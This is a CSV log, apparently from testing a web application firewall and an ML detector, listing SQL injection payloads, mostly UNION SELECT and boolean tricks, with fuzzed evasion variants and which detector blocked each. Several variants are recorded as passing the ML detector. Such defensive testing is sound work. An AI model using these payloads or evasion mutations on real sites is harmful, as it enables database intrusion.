Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
16,2024-12-16T19:24:40.891568,1' in boolean mode  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  #,403,403,200,waf_correct_ml_incorrect,"1' in boolean mode  )   and 'z'='z'  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  0x6a  )  ||chr  (  113   )    )   ||  (  sElECT   (/**/ cASe wHEn   (  2853  = 
2853  )   tHeN 1 eLSe 0 eNd   )    )   ::text OR   (  chr  (  113  )  ||chr  (   AND 1  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    As numeric  )  #",2024-12-16T19:24:57.545835,403,200,waf_correct_ml_incorrect,"(SELECT 1)' in boolean mode  )   and 'z'='z'  =  cast   (    (   chr  (  113/**/ )  ||chr  ( 
4422 LIKE 4422  )  ||chr  (  112  )  ||chr  (  0x6a  )   OR chr  (  113   )    )   ||  (  SELeCt   (/**/ CAsE when   (  2853  = 
2853  )   ThEN 1 ELSe 0x0 eND   )    )   ::text or   (  chr  (  113  )  ||chr  (   anD 1  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    As numeric  )  #v",2024-12-16T19:25:15.620838,403,200,waf_correct_ml_incorrect,"(SeLect 1)' in boolean mode  )   and 'z'='z'  =  cast   (    (   chr  (  113  )  ||chr  ( 
4422 LIKE 4422  )  ||chr  (  (sELecT 1)  )  ||chr  (  0x6a  )   OR chr  (  113   )    )   ||  (  sElECT   (/**/ CAsE WHEn   (  (SELECT 2853)  = 
2853  )   THeN 1 elSE 0x0 eNd   )    )   ::text or   (  chr  (  '@G'<>'@Gt' 	)  ||chr  (   ANd 1  )  ||chr  (  118  )   or chr  (  122  )  ||chr  (  113   )    )    AS numeric  )  #vTs",2024-12-16T19:25:35.388029,403,200,waf_correct_ml_incorrect,"(SeLEct 1)' in boolean mode  )   and 'z'='z'  =  cast   (    (   chr  (  (SELECT 113)  )  ||chr  ( 
4422 LIKE  AND 1  )  ||chr  (  (sELecT 1)  )  ||chr  (  0x6a  )   OR chr  (  113   )    )   ||  (  sElECT   (/**/ CAsE WHEn   (  (SELECT 2853)  = 
2853  )   THeN 1 elSE 0x0 eNd   )    )   ::text or   (  chr  (  '@G'<>'@Gt' 	)  ||chr  (   AnD 1  )  ||chr  (  118 /**/)   OR chr  (  'd'!='d''	 )   or chr  (  113   )    )    AS numeric  )  #vTsJ-",2024-12-16T19:25:56.323091,403,403,both_correct,"(SelECt 1)' in boolean mode  )   and 'z'='z'  =  cast   (    (   chr  (  (SELECT (SELECT 113))  )  ||chr  ( 
4422 LIKE  AND 1  )  ||chr  (  (sELecT 1)  )  ||chr  (  0x6a  )   OR chr  (  113   )    )   ||  (  sElECT   (/**/ CAsE WHEn   (  (SELECT (SELECT 1))  = 	2853  )   THeN 1 elSE 0x0 eNd   )    )   ::text or/**/  (  chr  (  '@G'<>'@Gt' 	)  ||chr  (   AnD 1  )  ||chr  (  ');RX+' LIKE ');RX+' /**/)   OR chr  (  'd'!='d''	 )   oR chr  (  113   )    )    aS numeric  )  #vTsJ-2",2024-12-16T19:26:18.288124,403,403,both_correct
17,2024-12-16T19:26:41.988974,"-4462%""  )   or 8571  =  8571--",403,403,200,waf_correct_ml_incorrect,"- AND 1%""  )
  Or 0x217b/*kpkj9*/ =  ',' LIKe ','--",2024-12-16T19:26:43.579143,403,403,both_correct,"- AnD  AND 1%""  )	/**/ OR 0x217b/*	26ua*/ =  ',' like ','--",2024-12-16T19:26:47.038172,403,403,both_correct,"- And  aND 0x1%""  )
  or 0x217b/**/  LIKE   ',' like ','--",2024-12-16T19:26:50.907630,403,200,waf_correct_ml_incorrect,"- And  aND 0x1%""  )
  oR 0x217b	  liKe   ',' Like ','--",2024-12-16T19:26:54.774733,403,200,waf_correct_ml_incorrect,"- ANd  AnD 0x1%""  )   oR 0x217b	  lIKe /**/ ',' like ','--",2024-12-16T19:26:58.696858,403,200,waf_correct_ml_incorrect
18,2024-12-16T19:27:02.562805,das,200,200,200,both_correct,das,2024-12-16T19:27:02.835604,200,200,both_correct,das,2024-12-16T19:27:04.103765,200,200,both_correct,das,2024-12-16T19:27:05.384880,200,200,both_correct,das,2024-12-16T19:27:06.645566,200,200,both_correct,das,2024-12-16T19:27:07.922624,200,200,both_correct
19,2024-12-16T19:27:09.197068,5.77313E+14,200,200,200,both_correct," OR/**/0.77313E+(SeleCt
'dG' not like 'dG'')",2024-12-16T19:27:09.833855,200,200,both_correct," or  AND 1.77313E+(SELeCT
'dG'
not like 'dG'')",2024-12-16T19:27:12.962563,200,403,waf_correct_ml_incorrect," Or  &&  AnD 0x10c6 NOT/**/LIKE 4295.77313E+(SelECt	'dG'
not like 'dG'')",2024-12-16T19:27:16.177936,200,200,both_correct," oR  && /**/aNd 0x10c6 NOT/**/LiKE '@'='@'.77313E+(sElECT	'dG'
not	like 'dG'')",2024-12-16T19:27:20.647699,200,200,both_correct," ||  && /**/and/**/0x10c6 NOT/**/lIKe '@'='@'.77313E+(SElEct	'dG'
not like 'dG'')",2024-12-16T19:27:25.397532,200,200,both_correct
20,2024-12-16T19:27:30.286630,"1' where 6721  =  6721 union all select null,null,null,null,null,null,null,null,null,null#",403,403,403,both_correct," ANd 0x1' wherE 330 LIKE 330/**/ =  6721	union all seLeCt null,null,null,null,null,null,null,null,null,null#",2024-12-16T19:27:34.870066,403,403,both_correct," ANd 0x1'/**/wheRe  and 1 LiKE 0x14a/*/d1*/ =  1086 NOT LIKE 1087
union all selEcT null,null,null,null,null,null,null,null,null,null#",2024-12-16T19:27:41.020528,403,403,both_correct," and 0x1' where  ANd 1 lIke 0x14a/*/d1*/ =  (SELECT 1) NOT LIKE (selECt '\f!'='\f!')	union all SElect null,null,null,null,null,null,null,null,null,null#;",2024-12-16T19:27:48.269222,403,403,both_correct,"/**/And 0x1' where  ANd  OR (SELECT 0) lIke 0x14a/*/d1*/ =  (SELECT '_%'!='_%d') NOT	LIKE (selECt '\f!'='\f!')	union all selECT null,null,null,null,null,null,null,null,null,null#;$",2024-12-16T19:27:56.460224,403,403,both_correct," anD 0x1' where  ANd  OR (SELECT  AND 3368!=(SELECT 3369)) lIke 0x14a/*/d1*/ =  (SELECT '_%'!='_%d') NOT
LIKE (selECt '\f!'='\f!')	union all SeLECT null,null,null,null,null,null,null,null,null,null#;$",2024-12-16T19:28:06.119517,403,403,both_correct
21,2024-12-16T19:28:16.532878,1984,200,200,200,both_correct,(SELeCT/**/0x1),2024-12-16T19:28:16.841663,403,403,both_incorrect,(SeLecT	0x1),2024-12-16T19:28:18.652747,403,403,both_incorrect,"(SEleCT
0x1)",2024-12-16T19:28:20.346813,403,403,both_incorrect,(sElEcT	0x1),2024-12-16T19:28:22.030510,403,200,waf_incorrect_ml_correct,"(SelECT
0x1)",2024-12-16T19:28:23.701060,403,403,both_incorrect
22,2024-12-16T19:28:25.390536,"calle ponte vella s/n, 13e",200,200,200,both_correct,"calle/**/ponte
vella s/n, 13e",2024-12-16T19:28:26.701171,200,200,both_correct,"calle ponte
vella
s/n, 13e",2024-12-16T19:28:29.146823,200,200,both_correct,"calle	ponte
vella
s/n,/**/13e",2024-12-16T19:28:31.675097,200,200,both_correct,"calle	ponte
vella/*z*/s/n,/**/13e",2024-12-16T19:28:34.287262,200,200,both_correct,"calle/**/ponte
vella/*z*/s/n,/*_*/13e",2024-12-16T19:28:37.008272,200,200,both_correct
23,2024-12-16T19:28:39.819709,gaviota 13,200,200,200,both_correct,"gaviota/**e*/
or (SELECT 1758!=1759)",2024-12-16T19:28:40.409536,403,403,both_incorrect,"gaviota/**e*/
OR (SELect 
OR/*""\)4*/9172=9172<>0x6df)",2024-12-16T19:28:43.199066,200,200,both_correct,"gaviota/**e*/
Or
(SelecT/*i&@s*/
or/*""\)(SELECT (SELECT 1))*/'GAf''!='GAf'U' LikE 9172<>0x6df)",2024-12-16T19:28:46.760905,403,200,waf_incorrect_ml_correct,"gaviota/**e*/	or
(SelEcT/*i&@s*/
oR/*""\)(SELECT (SELECT (SELECT 1)))*/'GAf''!='GAf'U'/**/likE 0x1b8b IN (7050,7051,7052)!=0x6df)",2024-12-16T19:28:52.292266,403,403,both_incorrect,"gaviota/**e*/ ||
(SelecT/*uHP.*/
oR/*""\)(SELECT (SELECT (SELECT (SELECT '}4'='}4'))))*/'GAf''!='GAf'U' LIKe 0x1b8b In (7050,(SeLECt 7051),7052)!=0x6df)",2024-12-16T19:28:59.406123,403,403,both_incorrect
24,2024-12-16T19:29:07.854092,"-9315'   )    )     )   union all select 5057,5057,5057,5057,5057#",403,403,403,both_correct,"-(seleCt 3045)<>3046'   )    )  /**/  )  	union all SELect 5057,5057,(SELECT 1),5057,5057#",2024-12-16T19:29:11.017649,403,403,both_correct,"-(SeLect 0xbe5) not like 2327 NOT LIKE 2328' 
 )    )     )  	union all SEleCt 5057, AND 1,(SelEct 1),5057,5057#G",2024-12-16T19:29:16.331695,403,403,both_correct,"-(sElECt 0xbe5) not like/*__Xj*/2327 NOT LIKE 2328'   )    )     )  	union all SeLEct 5057, and 1,(SElECT 5924 lIKE  AnD 1),5057,(selECt 5057)#G",2024-12-16T19:29:22.732068,403,403,both_correct,"-(SeLEcT 0xbe5) not like/**/(sEleCT 2327) NOT LIKE 2328'   )    )     )   union all SElect 5057, && 1,(SeLecT  Or 0/**/lIKE  And 6859 Like 6859),5057,(SelEcT 5057)#Gye",2024-12-16T19:29:30.827597,403,403,both_correct,"-(SELeCt 0xbe5) not like/**/(seLECT 2327) not like 2328'   )    )   
 )   union all/**/SeLECT 'M1' LIKE 'M1', && 1,(SeLEct  oR (SELECT 1)/**/liKE  aND 6859 liKe 6859),(SELECT 5057),(sElecT 5057)#Gyes%",2024-12-16T19:29:39.682835,403,403,both_correct
25,2024-12-16T19:29:49.961701,general ricardos 187,200,200,200,both_correct,general/**/ricardos	0xbb,2024-12-16T19:29:51.038169,200,200,both_correct,general ricardos 0xbb,2024-12-16T19:29:53.260544,200,200,both_correct,general	ricardos/**/0xbb,2024-12-16T19:29:55.499037,200,200,both_correct,general ricardos 0xbb,2024-12-16T19:29:57.885454,200,200,both_correct,"general/**/ricardos
0xbb",2024-12-16T19:30:00.019415,200,200,both_correct
